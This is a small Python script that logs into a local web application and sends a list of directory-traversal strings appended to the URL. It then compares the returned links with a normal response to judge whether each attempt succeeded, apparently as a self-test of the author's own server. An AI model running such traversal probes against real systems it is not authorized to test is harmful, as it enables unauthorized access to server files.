from bs4 import BeautifulSoup
import getpass
import requests
import os

def pTest(attack_string, attack_url, password):
    payload = {'password': password}
    with requests.Session() as s:
        p = s.post(attack_url + 'login', data=payload)
        r = requests.Request('GET', attack_url)
        prepared = s.prepare_request(r)
        prepared.url += attack_string
        response = s.send(prepared)
        print('Sending request with url:', prepared.url)
        #print('Request successful:', response.ok)

        if response.ok:
            soup = BeautifulSoup(response.text, 'html.parser')
            safeResponse = s.get(attack_url)
            soup2 = BeautifulSoup(safeResponse.text, 'html.parser')

            if (response.text == safeResponse.text):
                print("Attack Failed - Attack Led to Top Directory")
            else:
                print("Attack may have succeded")
                print("Attack response tags:")
                for link in soup.find_all('a'):
                    print(link.get('href'))
                print('')
                print('Safe Output')
                print('')
                for link in soup2.find_all('a'):
                    print(link.get('href'))
        else:
            print('Attack Failed - No Such Directory')



def pWrap(attack_string):
    pTest(attack_string=attack_string, attack_url=ATTACK_URL, password=PASSWORD)

PASSWORD = os.getenv('PWRD')
ATTACK_URL ='http://127.0.0.1:5050/'
ATTACK_STRINGS = [
'../../../..',
'test/../.././.../',
'..',
'level1/../..',
'level1/../../',
'pwd'
]

if __name__ == '__main__':
    if not PASSWORD:
        PASSWORD = print('First set environment variable PWRD. (export PWRD=YOUR_PASSWORD)')
    else:
        for attack in ATTACK_STRINGS:
            pWrap(attack)
